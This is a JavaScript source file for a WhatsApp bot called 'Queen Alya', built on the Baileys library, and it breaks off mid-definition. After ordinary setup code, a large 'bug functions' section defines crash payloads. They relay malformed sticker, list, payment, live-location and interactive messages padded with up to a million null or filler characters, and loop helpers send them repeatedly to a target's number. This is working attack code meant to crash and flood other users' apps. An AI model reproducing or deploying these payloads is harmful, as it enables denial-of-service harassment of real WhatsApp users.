require('./lib/listmenu')
const {
	downloadContentFromMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    InteractiveMessage,
    getContentType
} = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')
const jsobfus = require('javascript-obfuscator')
const {translate} = require('@vitalets/google-translate-api')
const { download } = require('aptoide-scraper');
const scp2 = require('./lib/scraper2') 
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./lib/scraper3.js')
const pkg = require('imgur')
const balya = fs.readFileSync('./AlyaMedia/theme/alya.jpg')
const { ImgurClient } = pkg
const uploadImage = require('./lib/uploadImage')
const client = new ImgurClient({ clientId: "a0113354926015a" })
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    fetchBuffer,
    buffergif,
    GIFBufferToVideoBuffer,
    totalcase
} = require('./lib/myfunc')
const { alya_antispam } = require('./lib/antispam')
//prem owner function
const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
//store
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./lib/list')

//cooldone
let lastUsed = 0;

//data
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
//media
const VoiceNoteAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/alyavn.json'))
const StickerAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/alyasticker.json'))
const ImageAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/alyaimage.json'))
const VideoAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/alyavideo.json'))
const DocAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/doc.json'))
const ZipAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/zip.json'))
const ApkAlya = JSON.parse(fs.readFileSync('./AlyaMedia/database/apk.json'))

//bug database
const { alyatext1 } = require('./src/data/function/ABug/alyatext1')
const { alyatext2 } = require('./src/data/function/ABug/alyatext2')
const { alyatext3 } = require('./src/data/function/ABug/alyatext3')
const { alyatext4 } = require('./src/data/function/ABug/alyatext4')
const { alyatext5 } = require('./src/data/function/ABug/alyatext5')
const { alyatext6 } = require('./src/data/function/ABug/alyatext6')
const wkwk = fs.readFileSync(`./src/data/function/ABug/x.mp3`)
const xsteek = fs.readFileSync(`./src/data/function/ABug/x.webp`)

//store database
const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))

const alyachoosen = JSON.parse(fs.readFileSync('./src/data/role/user.json'))

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []
const king = ('https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09')
//time
const xtime = moment.tz('Africa/Nigeria').format('HH:mm:ss')
const xdate = moment.tz('Africa/Nigeria').format('DD/MM/YYYY')
const time2 = moment().tz('Africa/Nigeria').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var alyatimewisher = `Good Night 😴`
 }
 if(time2 < "19:00:00"){
var alyatimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var alyatimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var alyatimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var alyatimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var alyatimewisher = `Good Morning 🌄`
 } 
//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
//module
module.exports = AlyaBotInc = async (AlyaBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
       var body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
        var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['.', '/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix)
        //prefix2 and command2 particulary for auto download
        const prefix2 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
        const isCmd2 = body.startsWith(prefix2)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await AlyaBotInc.decodeJid(AlyaBotInc.user.id)
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const alyamisc = (m.quoted || m)
        const quoted = (alyamisc.mtype == 'buttonsMessage') ? alyamisc[Object.keys(alyamisc)[1]] : (alyamisc.mtype == 'templateMessage') ? alyamisc.hydratedTemplate[Object.keys(alyamisc.hydratedTemplate)[1]] : (alyamisc.mtype == 'product') ? alyamisc[Object.keys(alyamisc)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const alyabody = body.startsWith(pric)
        const isCommand = alyabody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await AlyaBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        //anti media
        const isAlyaMedia = m.mtype
        //user status
        const isUser = alyachoosen.includes(sender)
        const AlyaTheQueen = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= AlyaTheQueen || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(AlyaBotInc, m, premium)
        
        //theme sticker reply
        const AlyaStickWait = () => {
        let AlyaStikRep = fs.readFileSync('./AlyaMedia/theme/sticker_reply/wait.webp')
        AlyaBotInc.sendMessage(from, { sticker: AlyaStikRep }, { quoted: m })
        }
        const AlyaStickAdmin = () => {
        let AlyaStikRep = fs.readFileSync('./AlyaMedia/theme/sticker_reply/admin.webp')
        AlyaBotInc.sendMessage(from, { sticker: AlyaStikRep }, { quoted: m })
        }
        const AlyaStickBotAdmin = () => {
        let AlyaStikRep = fs.readFileSync('./AlyaMedia/theme/sticker_reply/botadmin.webp')
        AlyaBotInc.sendMessage(from, { sticker: AlyaStikRep }, { quoted: m })
        }
        const AlyaStickOwner = () => {
        let AlyaStikRep = fs.readFileSync('./AlyaMedia/theme/sticker_reply/owner.webp')
        AlyaBotInc.sendMessage(from, { sticker: AlyaStikRep }, { quoted: m })
        }
        const AlyaStickGroup = () => {
        let AlyaStikRep = fs.readFileSync('./AlyaMedia/theme/sticker_reply/group.webp')
        AlyaBotInc.sendMessage(from, { sticker: AlyaStikRep }, { quoted: m })
        }
        const AlyaStickPrivate = () => {
        let AlyaStikRep = fs.readFileSync('./AlyaMedia/theme/sticker_reply/private.webp')
        AlyaBotInc.sendMessage(from, { sticker: AlyaStikRep }, { quoted: m })
        }
 
//==========={bug functions}==============\\
const sendReaction = async reactionContent => {
                AlyaBotInc.sendMessage(m.chat, {
                    react: {
                        text: reactionContent,
                        key: m.key
                    }
                });
            };

            async function sendRepeatedMessages(jid, count) {
                for (let i = 0; i < count; i++) {
                    AlyaBotInc.sendMessage(
                        recipientJid,
                        {
                            text: "".repeat(50000)
                        },
                        {
                            participant: {
                                jid: jid
                            },
                            messageId: etc.key.id
                        },
                        {
                            quoted: m
                        }
                    );
                }
            }

            const zyd = {
                key: {
                    participant: "0@s.whatsapp.net",
                    ...(typeof m !== "undefined" && m.chat
                        ? {
                            remoteJid: "status@broadcast"
                        }: {})
                },
                message: {
                    listResponseMessage: {
                        title: "👑QUEEN ALYA👑"
                    }
                }
            };
            async function stickerBug(jid) {
                const _0x3edf68 = {
                    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
                    fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                    fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                    mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                    mimetype: "image/webp",
                    directPath:
                    "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
                    fileLength: "10116",
                    mediaKeyTimestamp: "1715876003",
                    isAnimated: false,
                    stickerSentTs: "1715881084144",
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false
                };
                const _0x5d903d = {
                    stickerMessage: _0x3edf68
                };
                var messageContent = generateWAMessageFromContent(
                    jid,
                    proto.Message.fromObject(_0x5d903d),
                    {
                        userJid: jid,
                        quoted: zyd
                    }
                );
                await AlyaBotInc.relayMessage(jid, messageContent.message, {
                    participant: {
                        jid: jid
                    },
                    messageId: messageContent.key.id
                });
            }

            async function ButtonWithImageBug(jid) {
                const upload = {
                    upload: AlyaBotInc.waUploadToServer
                };
                const text = {
                    text: ""
                };
                var messageContent = generateWAMessageFromContent(
                    jid,
                    proto.Message.fromObject({
                        interactiveMessage: {
                            header: {
                                title: "👑QUEEN ALYA👑",
                                hasMediaAttachment: true,
                                ...(await prepareWAMessageMedia(
                                    {
                                        image: {
                                            url: "https://i.imgur.com/QfDM014.jpeg"
                                        }
                                    },
                                    upload
                                ))
                            },
                            body: text,
                            footer: {
                                text: "›          #👑QUEEN ALYA👑"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "\0".repeat(1000000)
                            }
                        }
                    }),
                    {
                        userJid: jid,
                        quoted: zyd
                    }
                );
                await AlyaBotInc.relayMessage(jid, messageContent.message, {
                    participant: {
                        jid: jid
                    },
                    messageId: messageContent.key.id
                });
            }

            async function LocationBug(jid) {
                var messageContent = generateWAMessageFromContent(
                    jid,
                    proto.Message.fromObject({
                        viewOnceMessage: {
                            message: {
                                liveLocationMessage: {
                                    degreesLatitude: "p",
                                    degreesLongitude: "p",
                                    caption:
                                    "👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑" +
                                    "ꦾ".repeat(50000),
                                    sequenceNumber: "0",
                                    jpegThumbnail: ""
                                }
                            }
                        }
                    }),
                    {
                        userJid: jid,
                        quoted: zyd
                    }
                );
                await AlyaBotInc.relayMessage(jid, messageContent.message, {
                    participant: {
                        jid: jid
                    },
                    messageId: messageContent.key.id
                });
            }
            async function BugPayments(jid) {
                const h = {
                    product_header_info_id: 0x4433e2e130,
                    product_header_is_rejected: false
                };
                var messageContent = generateWAMessageFromContent(
                    jid,
                    proto.Message.fromObject({
                        listMessage: {
                            title: "👑QUEEN ALYA👑" + "\0".repeat(920000),
                            footerText:
                            "👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑",
                            description:
                            "👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑",
                            buttonText: null,
                            listType: 0x2,
                            productListInfo: {
                                productSections: [{
                                    title: "balya",
                                    products: [{
                                        productId: "4392524570816732"
                                    }]
                                }],
                                productListHeaderImage: {
                                    productId: "4392524570816732",
                                    jpegThumbnail: null
                                },
                                businessOwnerJid: "0@s.whatsapp.net"
                            }
                        },
                        footer: "puki",
                        contextInfo: {
                            expiration: 0x93a80,
                            ephemeralSettingTimestamp: "1679959486",
                            entryPointConversionSource: "global_search_new_chat",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 0x9,
                            disappearingMode: {
                                initiator: "INITIATED_BY_ME"
                            }
                        },
                        selectListType: 0x2,
                        product_header_info: h
                    }),
                    {
                        userJid: jid,
                        quoted: zyd
                    }
                );
                await AlyaBotInc.relayMessage(jid, messageContent.message, {
                    participant: {
                        jid: jid
                    },
                    messageId: messageContent.key.id
                });
            }

            async function sendViewOnceMessages(jid, count) {
                for (let i = 0; i < count; i++) {
                    let messageContent = generateWAMessageFromContent(
                        jid,
                        {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadata: {},
                                        deviceListMetadataVersion: 2
                                    },
                                    interactiveMessage:
                                    proto.Message.InteractiveMessage.create({
                                        body: proto.Message.InteractiveMessage.Body.create(
                                            {
                                                text: ""
                                            }
                                        ),
                                        footer: proto.Message.InteractiveMessage.Footer.create(
                                            {
                                                text: ""
                                            }
                                        ),
                                        header: proto.Message.InteractiveMessage.Header.create(
                                            {
                                                title: "",
                                                subtitle: "",
                                                hasMediaAttachment: false
                                            }
                                        ),
                                        nativeFlowMessage:
                                        proto.Message.InteractiveMessage.NativeFlowMessage.create(
                                            {
                                                buttons: [{
                                                    name: "cta_url",
                                                    buttonParamsJson:
                                                    '{"display_text":"à¾§".repeat(50000),"url":"https://www.google.com","merchant_url":"https://www.google.com"}'
                                                }],
                                                messageParamsJson:
                                                "\0".repeat(100000)
                                            }
                                        )
                                    })
                                }
                            }
                        },
                        {}
                    );
                    AlyaBotInc.relayMessage(jid, messageContent.message, {
                        messageId: messageContent.key.id
                    });
                }
            }
            async function OneShot(jid) {
                for (let jmlh = "3"; jmlh !== 0; jmlh -= 1) {
                    await AlyaBotInc.relayMessage(
                        jid,
                        {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadataVersion: 0x2,
                                        deviceListMetadata: {}
                                    },
                                    interactiveMessage: {
                                        nativeFlowMessage: {
                                            buttons: [{
                                                name: "payment_info",
                                                buttonParamsJson:
                                                '{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"👑드림 가이 ALYA","key":"+234912xxxxxx3","key_type":"X"}}]}'
                                            }]
                                        }
                                    }
                                }
                            }
                        },
                        {
                            participant: {
                                jid: jid
                            }
                        },
                        {
                            messageId: null
                        }
                    );
                }
                for (let jmlhh = "3"; jmlhh !== 0; jmlhh -= 1) {
                    await AlyaBotInc.relayMessage(
                        jid,
                        {
                            viewOnceMessage: {
                                message: {
                                    interactiveMessage: {
                                        header: {
                                            title: "",
                                            subtitle: " "
                                        },
                                        body: {
                                            text: "👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑👑QUEEN ALYA👑"
                                        },
                                        footer: {
                                            text: "xp"
                                        },
                                        nativeFlowMessage: {
                                            buttons: [{
                                                name: "cta_url",
                                                buttonParamsJson:
                                                "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
                                            }],
                                            messageParamsJson: "\0".repeat(1000000)
                                        }
                                    }
                                }
                            }
                        },
                        {
                            participant: {
                                jid: jid
                            }
                        }
                    );
                }
            }
            async function sendPaymentInfoMessage(jid) {
                await AlyaBotInc.relayMessage(
                    jid,
                    {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadataVersion: 0x2,
                                    deviceListMetadata: {}
                                },
                                interactiveMessage: {
                                    nativeFlowMessage: {
                                        buttons: [{
                                            name: "payment_info",
                                            buttonParamsJson: JSON.stringify({
                                                currency: "BRL",
                                                total_amount: {
                                                    value: 0,
                                                    offset: 100
                                                },
                                                reference_id: "4P46GMY57GC",
                                                type: "physical-goods",
                                                order: {
                                                    status: "pending",
                                                    subtotal: {
                                                        value: 0,
                                                        offset: 100
                                                    },
                                                    order_type: "ORDER",
                                                    items: [{
                                                        name: "",
                                                        amount: {
                                                            value: 0,
                                                            offset: 100
                                                        },
                                                        quantity: 0,
                                                        sale_amount: {
                                                            value: 0,
                                                            offset: 100
                                                        }
                                                    }]
                                                },
                                                payment_settings: [{
                                                    type: "pix_static_code",
                                                    pix_static_code: {
                                                        merchant_name:
                                                        "meu ovo",
                                                        key: "+5533998586057",
                                                        key_type: "X"
                                                    }
                                                }]
                                            })
                                        }]
                                    }
                                }
                            }
                        }
                    },
                    {
                        participant: {
                            jid: jid
                        }
                    },
                    {
                        messageId: null
                    }
                );
            }

            async function sendSystemCrashMessage(jid) {
                var messageContent = generateWAMessageFromContent(
                    jid,
                    proto.Message.fromObject({
                        viewOnceMessage: {
                            message: {
                                interactiveMessage: {
                                    header: {
                                        title: "",
                                        subtitle: " "
                                    },
                                    body: {
                                        text: "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸"
                                    },
                                    footer: {
                                        text: "xp"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [{
                                            name: "cta_url",
                                            buttonParamsJson:
                                            "{ display_text : 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸', url : , merchant_url :  }"
                                        }],
                                        messageParamsJson: "\0".repeat(1000000)
                                    }
                                }
                            }
                        }
                    }),
                    {
                        userJid: jid
                    }
                );
                await AlyaBotInc.relayMessage(jid, messageContent.message, {
                    participant: {
                        jid: jid
                    },
                    messageId: messageContent.key.id
                });
            }
            async function sendListMessage(jid) {
                var messageContent = generateWAMessageFromContent(
                    jid,
                    proto.Message.fromObject({
                        listMessage: {
                            title:
                            "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" +
                            "\0".repeat(920000),
                            footerText:
                            "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
                            description:
                            "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
                            buttonText: null,
                            listType: 2,
                            productListInfo: {
                                productSections: [{
                                    title: "lol",
                                    products: [{
                                        productId: "4392524570816732"
                                    }]
                                }],
                                productListHeaderImage: {
                                    productId: "4392524570816732",
                                    jpegThumbnail: null
                                },
                                businessOwnerJid: "0@s.whatsapp.net"
                            }
                        },
                        footer: "lol",
                        contextInfo: {
                            expiration: 600000,
                            ephemeralSettingTimestamp: "1679959486",
                            entryPointConversionSource: "global_search_new_chat",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 9,
                            disappearingMode: {
                                initiator: "INITIATED_BY_ME"
                            }
                        },
                        selectListType: 2,
                        product_header_info: {
                            product_header_info_id: 292928282928,
                            product_header_is_rejected: false
                        }
                    }),
                    {
                        userJid: jid
                    }
                );

                await AlyaBotInc.relayMessage(jid, messageContent.message, {
                    participant: {
                        jid: jid
                    },
                    messageId: messageContent.key.id
                });
            }

            async function sendLiveLocationMessage(jid) {
                var messageContent = generateWAMessageFromContent(
                    jid,
                    proto.Message.fromObject({
                        viewOnceMessage: {
                            message: {
                                liveLocationMessage: {
                                    degreesLatitude: "p",
                                    degreesLongitude: "p",
                                    caption:
                                    "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" +
                                    "ê¦¾".repeat(50000),
                                    sequenceNumber: "0",
                                    jpegThumbnail: ""
                                }
                            }
                        }
                    }),
                    {
                        userJid: jid
                    }
                );

                await AlyaBotInc.relayMessage(jid, messageContent.message, {
                    participant: {
                        jid: jid
                    },
                    messageId: messageContent.key.id
                });
            }

            async function sendExtendedTextMessage(jid) {
                AlyaBotInc.relayMessage(
                    jid,
                    {
                        extendedTextMessage: {
                            text: ".",
                            contextInfo: {
                                stanzaId: jid,
                                participant: jid,
                                quotedMessage: {
                                    conversation:
                                    "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + "ê¦¾".repeat(50000)
                                },
                                disappearingMode: {
                                    initiator: "CHANGED_IN_CHAT",
                                    trigger: "CHAT_SETTING"
                                }
                            },
                            inviteLinkGroupTypeV2: "DEFAULT"
                        }
                    },
                    {
                        participant: {
                            jid: jid
                        }
                    },
                    {
                        messageId: null
                    }
                );
            }
            async function sendPaymentInvite(jid) {
                AlyaBotInc.relayMessage(
                    jid,
                    {
                        paymentInviteMessage: {
                            serviceType: "UPI",
                            expiryTimestamp: Date.now() + 86400000
                        }
                    },
                    {
                        participant: {
                            jid: jid
                        }
                    }
                );
            }

            async function sendMultiplePaymentInvites(jid, count) {
                for (let i = 0; i < count; i++) {
                    sendPaymentInvite(jid);
                    sendExtendedTextMessage(jid);
                    await sleep(500);
                }
            }

            async function sendVariousMessages(jid, count) {
                for (let i = 0; i < count; i++) {
                    sendListMessage(jid);
                    sendLiveLocationMessage(jid);
                    sendSystemCrashMessage(jid);
                    await sleep(500);
                }
            }

            async function sendRepeatedMessages2(jid, count) {
                for (let i = 0; i < count; i++) {
                    sendSystemCrashMessage(jid);
                    sendSystemCrashMessage(jid);
                    sendSystemCrashMessage(jid);
                    await sleep(500);
                }
            }

            async function sendMixedMessages(jid, count) {
                for (let i = 0; i < count; i++) {
                    sendLiveLocationMessage(jid);
                    sendListMessage(jid);
                    await sleep(500);
                }
            }

            function sendMessageWithMentions(text, mentions = [], quoted = false) {
                if (quoted == null || quoted == undefined || quoted == false) {
                    return AlyaBotInc.sendMessage(
                        m.chat,
                        {
                            text: text,
                            mentions: mentions
                        },
                        {
                            quoted: m
                        }
                    );
                } else {
                    return AlyaBotInc.sendMessage(
                        m.chat,
                        {
                            text: text,
                            mentions: mentions
                        },
                        {
                            quoted: m
                        }
                    );
                }
            }

            const abug2 = {
                key: {
                    remoteJid: "status@broadcast",
                    fromMe: false,
                    participant: "0@s.whatsapp.net"
                },
                message: {
                    listResponseMessage: {
                        title: botname
                    }
                }
            };

            const fakeflow = {
                key: {
                    remoteJid: "status@broadcast",
                    fromMe: false,
                    participant: "0@s.whatsapp.net"
                },
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: true,
                            jpegThumbnail: bimg
                        },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "review_and_pay",
                                buttonParamsJson: `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
                            }]
                        }
                    }
                }
            };

            const alyaimun = texto => {
                AlyaBotInc.sendMessage(
                    from,
                    {
                        text: texto, mentions: [sender]
                    },
                    {
                        quoted: m
                    }
                ).catch(e => {
                        return reply("Erro..");
                    });
            };

            const subscribe_alya = {
                key: {
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast"
                },
                message: {
                    listResponseMessage: {
                        title: `ALYA IS YOUR QUEEN`
                    }
                }
            };
            async function AlyaCrashy(alya, chat) {
                AlyaBotInc.sendMessage(
                    chat,
                    {
                        document: {
                            url: "./settings.js"
                        },
                        mimetype: `image/null`,
                        fileName: `${alya}.${alyatext1}`,
                        caption: `${alya + alyatext1}`
                    },
                    {
                        quoted: subscribe_alya
                    }
                );
            }
const painbug = { 
key: {
